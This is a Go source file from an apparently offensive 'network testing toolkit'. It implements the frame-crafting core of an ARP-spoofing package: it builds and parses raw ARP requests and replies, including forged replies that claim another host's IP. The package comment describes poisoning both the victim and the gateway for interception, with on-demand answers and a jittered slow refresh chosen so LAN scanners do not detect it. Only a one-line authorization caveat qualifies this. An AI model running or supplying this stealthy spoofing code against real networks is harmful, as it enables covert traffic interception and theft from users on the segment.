// GNULTE — network testing toolkit.
//
// Copyright (C) 2026 Neptune Productions.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Package arpspoof injects ARP replies directly on the wire, silently, so a
// traffic test does not announce itself to every scanner on the LAN.
//
// The classic arpspoof(8) tool floods periodic unsolicited replies, which an
// observer running its own ARP sweep can see plainly. This package instead
// answers ARP requests only when they are actually asked (on-demand) and
// re-arms the target's cache with a slow, jittered refresh. Both sides of a
// test are spoofed — the victim believes we are the gateway, and on request
// the gateway believes we are the victim — but the wire only carries frames
// that look like ordinary responses to real questions, plus a rare cache
// refresh (default ≈30 s). Use it only on networks you own or are authorized
// to test.
package arpspoof

import (
	"encoding/binary"
	"net"
)

// ethPArp is the Ethernet type for ARP.
const ethPArp = 0x0806

// ResolveMAC returns the MAC address of the local interface. It is a platform
// accessor so this file can stay buildable off Linux, where the field holding
// the address does not exist.
func (sp *Spoofer) LocalMAC() net.HardwareAddr { return sp.localMAC() }

// LocalIP returns the interface's IPv4 address — the sender a who-has request
// is crafted from, so a host answers our request instead of the gateway's.
// A platform accessor for the same reason as LocalMAC.
func (sp *Spoofer) LocalIP() net.IP { return sp.localIP() }

// BroadcastMAC is the Ethernet destination every ARP request goes to: asking
// "who has X" is a question for the whole segment, not a unicast.
var BroadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// BuildARPRequest crafts a complete Ethernet+ARP who-has frame (padded to the
// 60-byte minimum): broadcast destination, src localMAC, ARP op 1 asking who
// has askIP, told to answer localIP. It replaces shelling out to arping(8) for
// both the sweep and single-address MAC resolution.
func BuildARPRequest(localMAC net.HardwareAddr, localIP, askIP net.IP) []byte {
	frame := make([]byte, 60)
	copy(frame[0:6], BroadcastMAC) // Ethernet dst: everyone
	copy(frame[6:12], localMAC)    // Ethernet src: us
	binary.BigEndian.PutUint16(frame[12:14], ethPArp)

	arp := frame[14:]
	binary.BigEndian.PutUint16(arp[0:2], 1)      // htype: Ethernet
	binary.BigEndian.PutUint16(arp[2:4], 0x0800) // ptype: IPv4
	arp[4] = 6                                   // hlen
	arp[5] = 4                                   // plen
	binary.BigEndian.PutUint16(arp[6:8], 1)      // op: request
	copy(arp[8:14], localMAC)                    // sha: us
	copy(arp[14:18], localIP.To4())              // spa: our address
	// tha stays zeroed: we do not know who holds askIP yet.
	copy(arp[24:28], askIP.To4()) // tpa: who has this?
	return frame
}

// ParseARPReply decodes an Ethernet+ARP frame and reports whether it is an ARP
// *reply* (op 2). It returns the responder's MAC/IP (who answers, and for which
// address) plus the address the reply was aimed at — which, for a reply to our
// own who-has, is us and is how a caller can tell the answer was meant for it.
func ParseARPReply(frame []byte) (fromMAC net.HardwareAddr, fromIP, targetIP net.IP, ok bool) {
	if len(frame) < 42 {
		return nil, nil, nil, false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != ethPArp {
		return nil, nil, nil, false
	}
	arp := frame[14:]
	if binary.BigEndian.Uint16(arp[0:2]) != 1 || binary.BigEndian.Uint16(arp[2:4]) != 0x0800 {
		return nil, nil, nil, false
	}
	if arp[4] != 6 || arp[5] != 4 {
		return nil, nil, nil, false
	}
	if binary.BigEndian.Uint16(arp[6:8]) != 2 {
		return nil, nil, nil, false // a request is not an answer
	}
	fromMAC = append(net.HardwareAddr(nil), arp[8:14]...)
	fromIP = append(net.IP(nil), arp[14:18]...)
	targetIP = append(net.IP(nil), arp[24:28]...)
	return fromMAC, fromIP, targetIP, true
}

// BuildARPReply crafts a complete Ethernet+ARP reply frame (padded to the
// 60-byte minimum): dag = toMAC, src = localMAC, ARP op 2 with the claim that
// claimedIP lives at localMAC, addressed to toIP/toMAC. The frame is
// byte-identical in shape to what a real router emits when it answers.
func BuildARPReply(localMAC net.HardwareAddr, claimedIP, toIP net.IP, toMAC net.HardwareAddr) []byte {
	frame := make([]byte, 60)
	copy(frame[0:6], toMAC)     // Ethernet dst
	copy(frame[6:12], localMAC) // Ethernet src
	binary.BigEndian.PutUint16(frame[12:14], ethPArp)

	arp := frame[14:]
	binary.BigEndian.PutUint16(arp[0:2], 1)      // htype: Ethernet
	binary.BigEndian.PutUint16(arp[2:4], 0x0800) // ptype: IPv4
	arp[4] = 6                                   // hlen
	arp[5] = 4                                   // plen
	binary.BigEndian.PutUint16(arp[6:8], 2)      // op: reply
	copy(arp[8:14], localMAC)                    // sha: us
	copy(arp[14:18], claimedIP.To4())            // spa: the address we claim
	copy(arp[18:24], toMAC)                      // tha: the asker
	copy(arp[24:28], toIP.To4())                 // tpa
	return frame
}

// ParseARPRequest decodes an Ethernet+ARP frame and reports whether it is an
// ARP *request* (op 1). It returns the sender's MAC/IP and the IP being asked
// about, so a caller can decide whether to answer.
func ParseARPRequest(frame []byte) (fromMAC net.HardwareAddr, fromIP, askedIP net.IP, ok bool) {
	if len(frame) < 42 {
		return nil, nil, nil, false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != ethPArp {
		return nil, nil, nil, false
	}
	arp := frame[14:]
	if binary.BigEndian.Uint16(arp[0:2]) != 1 || binary.BigEndian.Uint16(arp[2:4]) != 0x0800 {
		return nil, nil, nil, false
	}
	if arp[4] != 6 || arp[5] != 4 {
		return nil, nil, nil, false
	}
	if binary.BigEndian.Uint16(arp[6:8]) != 1 {
		return nil, nil, nil, false // replies need no answer
	}
	fromMAC = append(net.HardwareAddr(nil), arp[8:14]...)
	fromIP = append(net.IP(nil), arp[14:18]...)
	askedIP = append(net.IP(nil), arp[24:28]...)
	return fromMAC, fromIP, askedIP, true
}

// IsLocal reports whether a MAC belongs to us (avoids answering our own echo).
func (sp *Spoofer) IsLocal(mac net.HardwareAddr) bool {
	return equalMAC(mac, sp.localMAC())
}

func equalMAC(a, b net.HardwareAddr) bool {
	if len(a) != 6 || len(b) != 6 {
		return false
	}
	for i := 0; i < 6; i++ {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
